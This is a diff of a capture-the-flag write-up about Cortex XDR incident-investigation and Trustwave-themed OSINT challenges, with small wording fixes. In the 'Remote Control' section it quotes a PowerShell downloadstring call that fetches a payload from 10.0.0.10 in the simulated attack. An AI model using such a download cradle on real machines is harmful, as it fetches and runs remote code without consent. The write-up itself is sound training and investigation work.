@@ -4,7 +4,8 @@ The event was held from Thursday, August 6 at 6:00 pm Pacific. End August 8 at 6
 
 My team managed to complete all the OSINT and Cortex XDR by Palo Alto Networks challenges. There are other challenges such as Software Defined Radio, DFIR, Crypto, Re, and Web as well.
 
-With that my team managed to rank at 44/189 teams
+With that my team managed to rank at 44/189 teams.
+
 <img src="https://user-images.githubusercontent.com/54532620/89723667-e80f7f00-da2b-11ea-84bd-ecc77806aaf2.png">
 
 # Solutions
@@ -18,12 +19,12 @@ Navigate to the investigation tab and you will find the incident name as `Possib
 ### Lock it up
 A user in Accounting called saying they received a message from XDR that a file was quarantined. Name the file that has been quarantined by the XDR agent.
 
-Navigate to the alert table and find the account belongs to the accounting group and you will find `pomf.exe`
+Navigate to the alert table and find the account belongs to the accounting group and you will find the file `pomf.exe`
 
 ### Who’s Who?
 When analyzing a security event, XDR surfaces information of interest in each node of the causality flow chart. In the incident labeled 'Process requests the deletion of Windows Shadowcopies' on PeckPC, what user ran WINWORD.EXE?
 
-Right view the incident as mentioned as look through the alerts you will find `PECKPC\Administrator`
+Right click, view the incident as mentioned and look through the alerts you will find user `PECKPC\Administrator`
 
 ### Who Done it
 A Memory Corruption Exploit Incident was triggered where a user browsed to a malicious website. What is the username of the user that attempted to reach the malicious website?
@@ -47,14 +48,14 @@ XDR keeps logs of user activity. User Ben Widmer logged in and modified a profil
 ### Address Unknown
 In an Incident involving the host "PeckPC", a payload is downloaded form a malicious IP address. What other host(s) have been communicating with the IP address in question?
 
-There are a few hosts being flagged under the incident and I just tried `SpenglerPC` which turns out to the answer.
+There are a few hosts being flagged under the incident and I just tried `SpenglerPC` which turns out to be the answer.
 
 ### Remote Control
 When analyzing a security event, XDR surfaces information of interest in each node of the causality flow chart. In the incident labeled 'Process requests the deletion of Windows Shadowcopies', an initial payload is downloaded from a remote IP address to "PeckPC'. what is the IP address?
 
 <img src="https://user-images.githubusercontent.com/54532620/89723295-e8594b80-da26-11ea-9429-2d67891768eb.png">
 
-Click on the powershell.exe with .downloadstring('http://10.0.0.10/payload.txt ')), then network and you will find the dest IP is `10.0.0.10`
+Click on the powershell.exe with .downloadstring('http://10.0.0.10/payload.txt ')), then click network and you will find the dest IP is `10.0.0.10`
 
 <img src="https://user-images.githubusercontent.com/54532620/89723309-01fa9300-da27-11ea-8399-1f7e8814d31f.png">
 
@@ -76,7 +77,7 @@ In this incident, right click on the QuarterlySummary.pdf.exe artifacts and open
 
 <img src="https://user-images.githubusercontent.com/54532620/89723330-51d95a00-da27-11ea-870c-02deb4948b38.png">
 
-Thenafter, click on the view full report and you will find `192.251.226.206` under EU.
+Then, click on the view full report and you will find `192.251.226.206` under EU.
 
 <img src="https://user-images.githubusercontent.com/54532620/89723350-91a04180-da27-11ea-9ddc-2894a7f59aa6.png">
 
@@ -94,14 +95,16 @@ https://www.google.com.sg/maps/place/Sopraffina+Marketcaffe/@41.8825785,-87.6296
 
 But turns out CTF OSINT admin was hinting me that I shouldn't decipher the graffiti.
 
-Therefore, travelling down the alley you will find the address on the loading dock sign `THREE FIRST NATIONAL PLAZA` Didn't know you could find address on loading dock sign.
+Therefore, "travelling" down the alley you will find the address on the loading dock sign `THREE FIRST NATIONAL PLAZA` 
+
+Didn't know you could find address on loading dock sign.
 
 ### Who doesn't like takeout?
 What do we call this place?
 
 *hint: this is not in the normal "FLAG-" format.
 
-With the image, I goggle spiderlabs and found this video https://www.youtube.com/watch?v=ahN2M0Ng0ys and further searching and trying turns out `Trustwave SpiderLabs Fusion Center` is the answer.
+With the attached image, I goggle spiderlabs and found this video https://www.youtube.com/watch?v=ahN2M0Ng0ys and further searching and trying turns out `Trustwave SpiderLabs Fusion Center` is the answer.
 
 ### Who's talking to me?
 Can you find me?
@@ -114,7 +117,7 @@ Can you find me?
 
 Given attachment is 01-dont-feed-the-penguin.
 
-Kudos to my team mate, he managed to find the image https://foursquare.com/dasfiregod/list/places-you-can-find-me, upon clicking on the image and scroll through the comment and you will find `Nicholas Percoco` with the hint from the filename.
+Kudos to my team mate, he managed to find the image https://foursquare.com/dasfiregod/list/places-you-can-find-me, upon clicking on the image and scrolling through the comment and find `Nicholas Percoco` with the hint stated on the attachment.
 
 <img src="https://user-images.githubusercontent.com/54532620/89723428-9f09fb80-da28-11ea-9da1-94ef34c5a109.png">
 
@@ -123,7 +126,7 @@ Do you know who designed the build out for Trustwave's new North America headqua
 
 *hint: this is not in the normal "FLAG-" format.
 
-My team mate uses google advanced search and find out this https://www.americaninno.com/chicago/newsletters/trustwave-revamps-its-office-stealthy-startup-raises-6m/
+My team mate uses google advanced search and found this https://www.americaninno.com/chicago/newsletters/trustwave-revamps-its-office-stealthy-startup-raises-6m/
 
 The build out is designed by `Partners by Design`
 
@@ -134,7 +137,7 @@ Attached image is the same as `Who doesn't like takeout?` the hint on the image 
 Google search with “Trustwave” "SpiderLabs Fusion Center" "wall", found this article
 https://www.avnetwork.com/news/mediawall-v-video-wall-processor-supports-spiderlabs-fusion-center
 
-I tried submitting this `RGB Spectrum’s MediaWall V` as the answer, but turns out it’s just `RGB Spectrum` is the answer.
+I tried submitting this `RGB Spectrum’s MediaWall V` as the answer, but turns out to be just `RGB Spectrum` is the answer.
 
 ### Are you floored?
 What floors does Trustwave occupy at the North American headquaters location?
@@ -160,6 +163,6 @@ Who's the current plumbering contractor for the building that Trustwave's new No
 
 With the latest hint, I was able to find the website with all the building permits, to investigate further I download the entire CSV https://www.chicago.gov/city/en/depts/bldgs/dataset/building_permits.html file size is about 300MB.
 
-I opened the CSV and started to filter the address to 70 W Madison, sort the application date from newest to the oldest, and was trying different columns at first. Until I notice on the second row description after I expand about changing contractor. Therefore, the answer is `SOUTH PARK PLUMBING INC`
+I opened the CSV and started to filter the address to 70 W Madison, sort the application date from newest to the oldest, and was trying different columns at first. Until I notice on the second row description after I expand the description about changing contractor. Therefore, the answer is `SOUTH PARK PLUMBING INC`
 
 <img src="https://user-images.githubusercontent.com/54532620/89723614-64559280-da2b-11ea-8e66-ac209d49aef6.png">
